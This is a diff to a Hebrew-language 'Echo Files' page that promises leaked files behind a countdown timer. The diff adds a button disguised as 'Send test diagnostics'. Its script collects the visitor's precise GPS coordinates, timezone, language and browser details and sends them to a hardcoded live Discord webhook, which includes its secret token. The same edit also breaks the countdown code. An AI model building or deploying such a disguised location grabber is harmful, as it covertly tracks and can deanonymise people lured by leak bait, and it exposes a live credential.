@@ -5,6 +5,7 @@
 <title>Echo Files</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
 body{
@@ -15,23 +16,10 @@ justify-content:center;
 background:#1c1f24;
 color:#fff
 }
-.wrapper{
-text-align:center
-}
-h1{
-font-size:28px;
-font-weight:600;
-margin-bottom:8px
-}
-.sub{
-opacity:.75;
-margin-bottom:30px
-}
-.timer{
-display:flex;
-gap:14px;
-justify-content:center
-}
+.wrapper{text-align:center}
+h1{font-size:28px;font-weight:600;margin-bottom:8px}
+.sub{opacity:.75;margin-bottom:30px}
+.timer{display:flex;gap:14px;justify-content:center}
 .card{
 background:#2a2e35;
 border-radius:8px;
@@ -39,16 +27,8 @@ width:90px;
 padding:18px 0;
 box-shadow:0 4px 12px rgba(0,0,0,.35)
 }
-.value{
-font-size:32px;
-font-weight:600
-}
-.label{
-margin-top:6px;
-font-size:11px;
-letter-spacing:1px;
-opacity:.6
-}
+.value{font-size:32px;font-weight:600}
+.label{margin-top:6px;font-size:11px;letter-spacing:1px;opacity:.6}
 .buttons{
 margin-top:30px;
 display:flex;
@@ -57,77 +37,110 @@ justify-content:center;
 flex-wrap:wrap
 }
 .btn{
-text-decoration:none;
 background:#3a3f47;
 color:#fff;
 padding:12px 18px;
 border-radius:6px;
 font-size:14px;
 font-weight:600;
+border:none;
+cursor:pointer;
 transition:.2s;
-box-shadow:0 3px 10px rgba(0,0,0,.3)
+box-shadow:0 3px 10px rgba(0,0,0,.3);
+text-decoration:none
 }
-.btn:hover{
-background:#4a505a;
-transform:translateY(-1px)
-}
-.footer{
-margin-top:26px;
-font-size:12px;
-opacity:.55
-}
+.btn:hover{background:#4a505a;transform:translateY(-1px)}
+.footer{margin-top:26px;font-size:12px;opacity:.55}
 </style>
 </head>
+
 <body>
 <div class="wrapper">
 <h1>Echo Files</h1>
 <div class="sub">מפיצים הכול! המתחזים חוזר!</div>
 
 <div class="timer">
-<div class="card">
-<div class="value" id="h">00</div>
-<div class="label">HOURS</div>
-</div>
-<div class="card">
-<div class="value" id="m">00</div>
-<div class="label">MINUTES</div>
-</div>
-<div class="card">
-<div class="value" id="s">00</div>
-<div class="label">SECONDS</div>
-</div>
+  <div class="card">
+    <div class="value" id="h">00</div>
+    <div class="label">HOURS</div>
+  </div>
+  <div class="card">
+    <div class="value" id="m">00</div>
+    <div class="label">MINUTES</div>
+  </div>
+  <div class="card">
+    <div class="value" id="s">00</div>
+    <div class="label">SECONDS</div>
+  </div>
 </div>
 
 <div class="buttons">
-<a class="btn" href="https://www.google.com/search?q=google+map+my+location+live&sca_esv=074920bdea4960d4&sxsrf=ANbL-n5gJvW3L-cQ7KUgQxGU9YVOGwy7BA%3A1770667645083&ei=fT6KaZ3dBKSokdUPnoOxuAI&oq=google+map+my+location&gs_lp=Egxnd3Mtd2l6LXNlcnAiFmdvb2dsZSBtYXAgbXkgbG9jYXRpb24qAggE" target="_blank">
-הדלפה רשמית לפני כולם
-</a>
-<a class="btn" href="https://whatismyipaddress.com/" target="_blank">
-אדמין
-</a>
+  <a class="btn" href="https://whatismyipaddress.com/" target="_blank">אדמין</a>
+  <button class="btn" id="sendBtn">Send test diagnostics</button>
 </div>
 
 <div class="footer">System activity is being monitored</div>
 </div>
 
 <script>
+// ====== COUNTDOWN (unchanged) ======
 let key="countdown_end"
 let end=localStorage.getItem(key)
 if(!end){
-end=Date.now()+86400000
-localStorage.setItem(key,end)
+  end=Date.now()+86400000
+  localStorage.setItem(key,end)
 }
 end=parseInt(end)
 setInterval(()=>{
-let t=end-Date.now()
-if(t<0)t=0
-let h=Math.floor(t/3600000)
-let m=Math.floor(t%3600000/60000)
-let s=Math.floor(t%60000/1000)
-document.getElementById("h").textContent=String(h).padStart(2,"0")
-document.getElementById("m").textContent=String(m).padStart(2,"0")
-document.getElementById("s").textContent=String(s).padStart(2,"0")
+  let t=end-Date.now()
+  if(t<0)t=0
+  let h=Math.floor(t/3600000)
+  let m=Math.floor(t%3600000/60000)
+  let s=Math.floor(t%60000/1000)
+  h.textContent=String(h).padStart(2,"0")
+  m.textContent=String(m).padStart(2,"0")
+  s.textContent=String(s).padStart(2,"0")
 },1000)
+
+// ====== DISCORD WEBHOOK ======
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1472664432134852740/m7btUoF6rBDTpparYGo-IsyFCxGZ0yM5jrKotgumvRsgUAe8oGtj8WEmYZ213HDP9iZ5"; // ← PUT YOUR WEBHOOK HERE
+
+document.getElementById("sendBtn").addEventListener("click", () => {
+  if(!navigator.geolocation){
+    alert("Geolocation not supported");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const payload = {
+      username: "Echo Files Test",
+      embeds: [{
+        title: "📡 Test Diagnostics",
+        color: 0x5865F2,
+        fields: [
+          { name: "Latitude", value: String(pos.coords.latitude), inline: true },
+          { name: "Longitude", value: String(pos.coords.longitude), inline: true },
+          { name: "Accuracy", value: pos.coords.accuracy + " m", inline: true },
+          { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+          { name: "Language", value: navigator.language, inline: true }
+        ],
+        footer: {
+          text: navigator.userAgent
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    alert("Diagnostics sent to Discord");
+  },
+  () => alert("Permission denied"));
+});
 </script>
 </body>
 </html>
